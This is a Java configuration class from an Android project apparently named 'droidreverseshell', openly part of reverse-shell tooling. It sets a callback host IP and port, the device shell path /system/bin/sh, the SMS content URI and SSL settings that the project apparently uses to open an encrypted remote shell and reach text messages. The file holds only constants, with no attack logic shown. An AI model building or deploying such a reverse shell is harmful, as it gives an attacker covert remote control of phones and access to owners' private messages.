package solidus.android.droidreverseshell;

/**
 * Created by solidus on 3/24/14.
 */
public class Config {
    // Reverse Shell stuff
    public static final String HOST = "192.168.2.4";
    public static final String PORT = "7777";
    public static final String SHELL_PATH = "/system/bin/sh";
    public static final String SMS_URL = "content://sms/";
    public static final String USE_SSL_TRUE = "true";
    public static final String USE_SSL_FALSE = "false";

    // This won't change unless Android picks another security provider
    public static final String KEYSTORE_TYPE = "BKS";
    public static final String SSL_CONTEXT_TYPE = "TLS";
}
